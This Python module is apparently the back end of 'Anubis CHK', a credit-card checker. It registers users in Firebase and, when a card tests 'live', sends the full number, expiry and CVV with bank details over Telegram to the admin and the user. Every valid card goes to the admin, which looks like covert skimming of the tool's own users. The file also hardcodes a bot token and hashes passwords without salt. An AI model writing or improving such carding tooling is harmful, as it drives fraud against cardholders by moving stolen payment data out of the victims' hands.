"""
═══════════════════════════════════════════════════════════════
FIREBASE MANAGER — ANUBIS CHK
═══════════════════════════════════════════════════════════════
Maneja usuarios, sesiones y notificaciones de Telegram
═══════════════════════════════════════════════════════════════
"""

import os
import hashlib
import requests
import firebase_admin
from firebase_admin import credentials, firestore

# ── Configuración ─────────────────────────────────────────────
_BASE         = os.path.dirname(os.path.abspath(__file__))
KEY_PATH      = os.path.join(_BASE, "firebase_key.json")
TELEGRAM_TOKEN = "8764142166:AAGvhBc6M0xJLB0yvrFF4AITD8ZRYLMM9wg"   # ← pon tu token NUEVO aquí
ADMIN_CHAT_ID  = "7448403516"            # ← tu chat ID (ProChk)

# ── Inicializar Firebase (solo una vez) ───────────────────────
_db = None

def get_db():
    global _db
    if _db is None:
        if not firebase_admin._apps:
            cred = credentials.Certificate(KEY_PATH)
            firebase_admin.initialize_app(cred)
        _db = firestore.client()
    return _db


# ═════════════════════════════════════════════════════════════
# USUARIOS
# ═════════════════════════════════════════════════════════════

def _hash(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()


def registrar_usuario(username: str, password: str, chat_id: str, telegram_user: str = "") -> dict:
    """
    Registra un nuevo usuario en Firebase.
    Retorna {"ok": True} o {"ok": False, "error": "..."}
    """
    try:
        db = get_db()
        ref = db.collection("usuarios").document(username.lower())
        doc = ref.get()
        if doc.exists:
            return {"ok": False, "error": "Usuario ya existe"}

        ref.set({
            "username":      username.lower(),
            "password_hash": _hash(password),
            "chat_id":       str(chat_id),
            "telegram_user": telegram_user,
            "activo":        True,
            "lives_count":   0,
            "creado":        firestore.SERVER_TIMESTAMP,
        })
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def verificar_login(username: str, password: str) -> dict:
    """
    Verifica credenciales.
    Retorna {"ok": True, "chat_id": "...", "username": "..."} o {"ok": False, "error": "..."}
    """
    try:
        db  = get_db()
        ref = db.collection("usuarios").document(username.lower())
        doc = ref.get()

        if not doc.exists:
            return {"ok": False, "error": "Usuario no encontrado"}

        data = doc.to_dict()

        if not data.get("activo", True):
            return {"ok": False, "error": "Usuario desactivado"}

        if data.get("password_hash") != _hash(password):
            return {"ok": False, "error": "Contraseña incorrecta"}

        return {
            "ok":       True,
            "chat_id":  data.get("chat_id", ""),
            "username": data.get("username", username),
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


def obtener_todos_usuarios() -> list:
    """Retorna lista de todos los usuarios activos (para admin)"""
    try:
        db   = get_db()
        docs = db.collection("usuarios").where("activo", "==", True).stream()
        return [d.to_dict() for d in docs]
    except Exception:
        return []


def incrementar_lives(username: str):
    """Suma 1 al contador de lives del usuario"""
    try:
        db  = get_db()
        ref = db.collection("usuarios").document(username.lower())
        ref.update({"lives_count": firestore.Increment(1)})
    except Exception:
        pass


# ═════════════════════════════════════════════════════════════
# TELEGRAM
# ═════════════════════════════════════════════════════════════

def _send(chat_id: str, text: str):
    """Envía mensaje de Telegram (interno)"""
    try:
        url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except Exception:
        pass


def notificar_live(cc, mm, yy, cvv, resultado, gateway, bin_info, username="", user_chat_id=""):
    """
    Envía la live al usuario que la encontró Y al admin.
    Si no hay user_chat_id, solo manda al admin.
    """
    brand   = bin_info.get("brand",   "—")
    typ     = bin_info.get("type",    "—")
    bank    = bin_info.get("bank",    "—")
    country = bin_info.get("country", "—")
    level   = bin_info.get("level",   "—")

    msg = (
        f"✅ <b>LIVE ENCONTRADA</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Usuario: <b>{username}</b>\n"
        f"💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"⚡ Gateway: <b>{gateway}</b>\n"
        f"📋 Resultado: <b>{resultado}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🏦 {brand} {typ} — {level}\n"
        f"🏛 {bank}\n"
        f"🌍 {country}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 @anubischekbot"
    )

    # Siempre al admin
    _send(ADMIN_CHAT_ID, msg)

    # Al usuario si tiene chat_id y no es el mismo admin
    if user_chat_id and str(user_chat_id) != str(ADMIN_CHAT_ID):
        msg_user = (
            f"✅ <b>LIVE ENCONTRADA</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
            f"⚡ Gateway: <b>{gateway}</b>\n"
            f"📋 Resultado: <b>{resultado}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🏦 {brand} {typ} — {level}\n"
            f"🏛 {bank}\n"
            f"🌍 {country}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 @anubischekbot"
        )
        _send(user_chat_id, msg_user)

    # Incrementar contador
    if username:
        incrementar_lives(username)
